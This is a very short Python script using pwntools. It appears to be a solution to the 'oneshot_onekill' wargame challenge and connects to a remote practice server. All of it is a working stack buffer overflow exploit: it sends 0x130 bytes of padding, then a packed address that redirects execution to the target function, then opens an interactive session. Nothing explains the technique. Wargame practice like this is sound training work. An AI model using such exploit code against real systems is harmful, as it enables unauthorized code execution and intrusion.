from pwn import *

# a = process('./oneshot_onekill')
a = remote( 'prob.vulnerable.kr', 20026)
raw_input('debug')

oneshot_add = 0x080485A5
buf = 'a'*0x130
buf += p32(oneshot_add) 
a.sendline(buf)

a.interactive()